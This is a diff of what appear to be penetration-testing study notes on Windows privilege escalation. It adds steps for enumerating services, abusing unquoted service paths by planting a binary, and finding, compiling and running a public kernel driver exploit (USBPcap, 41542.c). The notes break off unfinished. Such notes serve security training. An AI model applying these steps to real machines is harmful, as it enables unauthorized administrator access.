@@ -18,6 +18,7 @@ hostname
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 # Enumerate running processes
 tasklist /SVC
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # Powershell
 # Enumerate networking
 ipconfig /all
 route print
@@ -130,7 +131,36 @@ net user admin newpassword
 # Success
 ```
 
-Using sigcheck from Sysinternals we can see if an application will autoElevate:  
-`sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe`  
+We can also leverage UAC (see exercises and unquoted service paths).
+E.g. unquoted C:\Program Files\My Program\My Service\service.exe. will try and run the following:
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```
+Simply replace one of the binaries in the required location.
+
+Windows Kernel Vulnerability:
+```cmd
+# Determine version and architecture of target
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+# Attempt to locate vulnerabilities:
+driverquery /v
+# Example vulnerable USBPCap
+searchsploit USBPcap
+# Note that drivers can often be in C:\Windows\System32\DRIVERS
+C:\Program Files\USBPcap> type USBPcap.inf
+# Run mingw-w64.bat so we can use gcc.
+C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
+# Transfer exploit and compile...
+gcc 41542.c -o exploit.exe
+# Run the exploit...
+
 
 ## Linux Privilege Escalation Examples
+
+See exercises.
+
+
+
